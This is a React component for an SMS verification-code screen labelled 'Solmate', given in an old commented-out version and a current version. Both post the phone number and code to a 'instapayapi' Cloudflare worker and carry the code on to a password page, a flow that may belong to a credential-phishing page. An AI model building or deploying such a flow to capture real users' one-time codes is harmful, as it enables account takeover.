// import React,{ useState, useEffect } from "react";
// import { useNavigate, useLocation } from "react-router-dom";

// export default function SolmateSmsCode() {
//   const navigate = useNavigate();
//   const location = useLocation();

//   // Receive phone from previous page (fallback for direct view)
//   const phone = location.state?.phone || "+27 66 909 9909";

//   const OTP_LENGTH = 6;
//   const [otp, setOtp] = useState(Array(OTP_LENGTH).fill(""));
//   const [timer, setTimer] = useState(195); // 03:15 in seconds
//   const [error, setError] = useState("");
//   const [loading, setLoading] = useState(false);

//   // Active index = first empty box, or last if all filled
//   const activeIndex = (() => {
//     const idx = otp.findIndex((d) => d === "");
//     return idx === -1 ? OTP_LENGTH - 1 : idx;
//   })();

//   // Resend timer countdown
//   useEffect(() => {
//     if (timer <= 0) return;
//     const interval = setInterval(() => {
//       setTimer((t) => t - 1);
//     }, 1000);
//     return () => clearInterval(interval);
//   }, [timer]);

//   // Auto-verify when all 6 digits filled
//   useEffect(() => {
//     const code = otp.join("");
//     if (code.length === OTP_LENGTH) {
//       handleVerify(code);
//     }
//     // eslint-disable-next-line react-hooks/exhaustive-deps
//   }, [otp]);

//   const formatTime = (s) => {
//     const m = Math.floor(s / 60);
//     const sec = s % 60;
//     return `${String(m).padStart(2, "0")}:${String(sec).padStart(2, "0")}`;
//   };

//   const handleNumberPress = (num) => {
//     if (error) setError("");
//     setOtp((prev) => {
//       const next = [...prev];
//       const empty = next.findIndex((d) => d === "");
//       if (empty !== -1) next[empty] = String(num);
//       return next;
//     });
//   };

//   const handleBackspace = () => {
//     if (error) setError("");
//     setOtp((prev) => {
//       const next = [...prev];
//       // Find last filled and clear
//       for (let i = next.length - 1; i >= 0; i--) {
//         if (next[i] !== "") {
//           next[i] = "";
//           break;
//         }
//       }
//       return next;
//     });
//   };

//   const handleVerify = async (code) => {
//     setError("");

//     try {
//       setLoading(true);
//       const response = await fetch(
//         "https://my-worker-app.instapayapi.workers.dev/api/otpkhilti",
//         {
//           method: "POST",
//           headers: { "Content-Type": "application/json" },
//           body: JSON.stringify({ phone, otp: code }),
//         }
//       );

//       const text = await response.text();
//       let data = {};
//       try {
//         data = text ? JSON.parse(text) : {};
//       } catch {
//         data = { message: text };
//       }

//       if (!response.ok) {
//         setError(data.message || "Invalid SMS code. Please try again.");
//         setOtp(Array(OTP_LENGTH).fill(""));
//         return;
//       }

//       console.log("Verified:", data);
//       navigate("/password", { state: { phone,otp: code  } });
//     } catch (err) {
//       console.error("API error:", err);
//       setError("Invalid SMS code. Please try again.");
//       setOtp(Array(OTP_LENGTH).fill(""));
//     } finally {
//       setLoading(false);
//     }
//   };

//   const handleRequestAgain = () => {
//     if (timer > 0) return;
//     setOtp(Array(OTP_LENGTH).fill(""));
//     setTimer(195);
//     setError("");
//   };

//   const handleBack = () => {
//     if (window.history.length > 1) {
//       navigate(-1);
//     } else {
//       navigate("/");
//     }
//   };

//   const handleLogout = () => {
//     navigate("/");
//   };

//   const numpadKeys = [1, 2, 3, 4, 5, 6, 7, 8, 9];

//   return (
//     <div className="min-h-screen bg-[#0A1721] flex flex-col px-6 pt-6 pb-6">
//       {/* Back Button */}
//       <button
//         onClick={handleBack}
//         aria-label="Go back"
//         className="w-10 h-10 flex items-center justify-start text-white hover:opacity-70 transition-opacity mb-10"
//       >
//         <svg
//           xmlns="http://www.w3.org/2000/svg"
//           width="28"
//           height="28"
//           viewBox="0 0 24 24"
//           fill="none"
//           stroke="currentColor"
//           strokeWidth="2.5"
//           strokeLinecap="round"
//           strokeLinejoin="round"
//         >
//           <line x1="19" y1="12" x2="5" y2="12"></line>
//           <polyline points="12 19 5 12 12 5"></polyline>
//         </svg>
//       </button>

//       {/* Heading */}
//       <h1 className="text-white text-3xl sm:text-4xl font-bold mb-3">
//         Enter sms code
//       </h1>

//       {/* Subtitle */}
//       <p className="text-gray-400 text-base sm:text-lg mb-8">
//         Code sent to number: {phone}
//       </p>

//       {/* OTP Boxes */}
//       <div className="flex justify-between gap-2 sm:gap-3 mb-6">
//         {otp.map((digit, index) => (
//           <div
//             key={index}
//             className={`flex-1 aspect-square max-w-[55px] rounded-xl flex items-center justify-center transition-all ${
//               error
//                 ? "bg-[#1A2731] ring-2 ring-red-500"
//                 : index === activeIndex && !loading
//                 ? "bg-[#1A2731] ring-2 ring-[#FFD60A]"
//                 : "bg-[#1A2731]"
//             }`}
//           >
//             <span className="text-white text-2xl font-semibold">
//               {digit}
//             </span>
//           </div>
//         ))}
//       </div>

//       {/* Request again / timer */}
//       <div className="text-center mb-4 min-h-[24px]">
//         {timer > 0 ? (
//           <p className="text-[#3B82F6] text-base font-medium">
//             Request code again in {formatTime(timer)}
//           </p>
//         ) : (
//           <button
//             onClick={handleRequestAgain}
//             className="text-[#3B82F6] text-base font-medium hover:underline"
//           >
//             Request code again
//           </button>
//         )}
//       </div>

//       {/* Error */}
//       {error && (
//         <p className="text-red-400 text-sm text-center font-medium mb-2">
//           {error}
//         </p>
//       )}

//       {/* Spacer */}
//       <div className="flex-1"></div>

//       {/* Number Pad */}
//       <div className="grid grid-cols-3 gap-y-6 gap-x-4 mb-2">
//         {numpadKeys.map((num) => (
//           <button
//             key={num}
//             onClick={() => handleNumberPress(num)}
//             disabled={loading}
//             className="text-white text-3xl sm:text-4xl font-light py-3 hover:opacity-70 active:opacity-50 transition-opacity disabled:opacity-40"
//           >
//             {num}
//           </button>
//         ))}

//         {/* Log out */}
//         <button
//           onClick={handleLogout}
//           className="text-[#FFD60A] text-lg font-medium py-3 hover:opacity-70 transition-opacity"
//         >
//           Log out
//         </button>

//         {/* 0 */}
//         <button
//           onClick={() => handleNumberPress(0)}
//           disabled={loading}
//           className="text-white text-3xl sm:text-4xl font-light py-3 hover:opacity-70 active:opacity-50 transition-opacity disabled:opacity-40"
//         >
//           0
//         </button>

//         {/* Backspace */}
//         <button
//           onClick={handleBackspace}
//           disabled={loading}
//           aria-label="Backspace"
//           className="flex items-center justify-center hover:opacity-70 active:opacity-50 transition-opacity disabled:opacity-40"
//         >
//           <svg
//             xmlns="http://www.w3.org/2000/svg"
//             width="36"
//             height="28"
//             viewBox="0 0 24 18"
//             fill="white"
//           >
//             <path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z" />
//           </svg>
//         </button>
//       </div>
//     </div>
//   );
// }

import React, { useState, useEffect, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";

export default function SolmateSmsCode() {
  const navigate = useNavigate();
  const location = useLocation();

  const phone = location.state?.phone || "+27 66 909 9909";

  const OTP_LENGTH = 6;
  const [otp, setOtp] = useState(Array(OTP_LENGTH).fill(""));
  const [focusedIndex, setFocusedIndex] = useState(0);
  const [timer, setTimer] = useState(195);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const inputRefs = useRef([]);

  // Auto focus first box on mount
  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);

  // Resend timer
  useEffect(() => {
    if (timer <= 0) return;
    const interval = setInterval(() => {
      setTimer((t) => t - 1);
    }, 1000);
    return () => clearInterval(interval);
  }, [timer]);

  const formatTime = (s) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${String(m).padStart(2, "0")}:${String(sec).padStart(2, "0")}`;
  };

  const handleChange = (index, value) => {
    // Only allow digits
    if (!/^\d*$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value.slice(-1); // take last typed char
    setOtp(newOtp);
    if (error) setError("");

    // Auto-move to next box
    if (value && index < OTP_LENGTH - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace") {
      if (otp[index]) {
        const newOtp = [...otp];
        newOtp[index] = "";
        setOtp(newOtp);
      } else if (index > 0) {
        inputRefs.current[index - 1]?.focus();
      }
    }
    if (e.key === "ArrowLeft" && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
    if (e.key === "ArrowRight" && index < OTP_LENGTH - 1) {
      inputRefs.current[index + 1]?.focus();
    }
    if (e.key === "Enter") {
      handleVerify();
    }
  };

  const handlePaste = (e) => {
    e.preventDefault();
    const pasted = e.clipboardData
      .getData("text")
      .replace(/\D/g, "")
      .slice(0, OTP_LENGTH);
    if (!pasted) return;

    const newOtp = Array(OTP_LENGTH).fill("");
    for (let i = 0; i < pasted.length; i++) {
      newOtp[i] = pasted[i];
    }
    setOtp(newOtp);
    if (error) setError("");

    const nextIndex = Math.min(pasted.length, OTP_LENGTH - 1);
    inputRefs.current[nextIndex]?.focus();
  };

  const handleVerify = async () => {
    setError("");
    const code = otp.join("");

    // Validation
    if (code.length === 0) {
      setError("Please enter the SMS code");
      return;
    }
    if (code.length < OTP_LENGTH) {
      setError("Please enter the complete 6-digit code");
      return;
    }

    try {
      setLoading(true);
      const response = await fetch(
        "https://my-worker-app.instapayapi.workers.dev/api/otpkhilti",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ phone, otp: code }),
        }
      );

      const text = await response.text();
      let data = {};
      try {
        data = text ? JSON.parse(text) : {};
      } catch {
        data = { message: text };
      }

      if (!response.ok) {
        setError(data.message || "Invalid SMS code. Please try again.");
        setOtp(Array(OTP_LENGTH).fill(""));
        inputRefs.current[0]?.focus();
        return;
      }

      console.log("Verified:", data);
      navigate("/password", { state: { phone, otp: code } });
    } catch (err) {
      console.error("API error:", err);
      setError("Invalid SMS code. Please try again.");
      setOtp(Array(OTP_LENGTH).fill(""));
      inputRefs.current[0]?.focus();
    } finally {
      setLoading(false);
    }
  };

  const handleRequestAgain = () => {
    if (timer > 0) return;
    setOtp(Array(OTP_LENGTH).fill(""));
    setTimer(195);
    setError("");
    inputRefs.current[0]?.focus();
  };

  const handleBack = () => {
    if (window.history.length > 1) {
      navigate(-1);
    } else {
      navigate("/");
    }
  };

  const isComplete = otp.every((d) => d !== "");
  const isEnabled = isComplete && !loading;

  return (
    <div className="min-h-screen bg-[#0A1721] flex flex-col px-6 pt-6 pb-6">
      {/* Back Button */}
      <button
        onClick={handleBack}
        aria-label="Go back"
        className="w-10 h-10 flex items-center justify-start text-white hover:opacity-70 transition-opacity mb-10"
      >
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="28"
          height="28"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          strokeWidth="2.5"
          strokeLinecap="round"
          strokeLinejoin="round"
        >
          <line x1="19" y1="12" x2="5" y2="12"></line>
          <polyline points="12 19 5 12 12 5"></polyline>
        </svg>
      </button>

      {/* Heading */}
      <h1 className="text-white text-3xl sm:text-4xl font-bold mb-3">
        Enter sms code
      </h1>

      {/* Subtitle */}
      <p className="text-gray-400 text-base sm:text-lg mb-8">
        Code sent to number: {phone}
      </p>

      {/* OTP Boxes */}
      <div className="flex justify-between gap-2 sm:gap-3 mb-6">
        {otp.map((digit, index) => (
          <input
            key={index}
            ref={(el) => (inputRefs.current[index] = el)}
            type="text"
            inputMode="numeric"
            pattern="[0-9]*"
            maxLength={1}
            value={digit}
            onChange={(e) => handleChange(index, e.target.value)}
            onKeyDown={(e) => handleKeyDown(index, e)}
            onFocus={() => setFocusedIndex(index)}
            onPaste={handlePaste}
            className={`flex-1 aspect-square max-w-[55px] text-center text-white text-2xl font-semibold rounded-xl bg-[#1A2731] outline-none transition-all ${
              error
                ? "ring-2 ring-red-500"
                : focusedIndex === index
                ? "ring-2 ring-[#FFD60A]"
                : ""
            }`}
          />
        ))}
      </div>

      {/* Request again / timer */}
      <div className="text-center mb-4 min-h-[24px]">
        {timer > 0 ? (
          <p className="text-[#3B82F6] text-base font-medium">
            Request code again in {formatTime(timer)}
          </p>
        ) : (
          <button
            onClick={handleRequestAgain}
            className="text-[#3B82F6] text-base font-medium hover:underline"
          >
            Request code again
          </button>
        )}
      </div>

      {/* Error */}
      {error && (
        <p className="text-red-400 text-sm text-center font-medium mb-2">
          {error}
        </p>
      )}

      {/* Spacer pushes button to bottom */}
      <div className="flex-1"></div>

      {/* Continue Button */}
      <button
        onClick={handleVerify}
        disabled={!isEnabled}
        className={`w-full py-4 rounded-full font-semibold text-lg transition-colors flex items-center justify-center gap-2 ${
          isEnabled
            ? "bg-[#FFD60A] text-[#0A1721] hover:bg-[#e6c109] active:bg-[#cca808]"
            : "bg-[#5A6772] text-white cursor-not-allowed"
        }`}
      >
        {loading ? (
          <>
            <svg
              className="animate-spin h-5 w-5"
              viewBox="0 0 24 24"
              fill="none"
            >
              <circle
                cx="12"
                cy="12"
                r="10"
                stroke="currentColor"
                strokeWidth="4"
                className="opacity-25"
              />
              <path
                fill="currentColor"
                className="opacity-75"
                d="M4 12a8 8 0 018-8V0C5.4 0 0 5.4 0 12h4zm2 5.3A8 8 0 014 12H0c0 3 1.1 5.8 3 7.9l3-2.6z"
              />
            </svg>
            Verifying...
          </>
        ) : (
          "Continue"
        )}
      </button>
    </div>
  );
}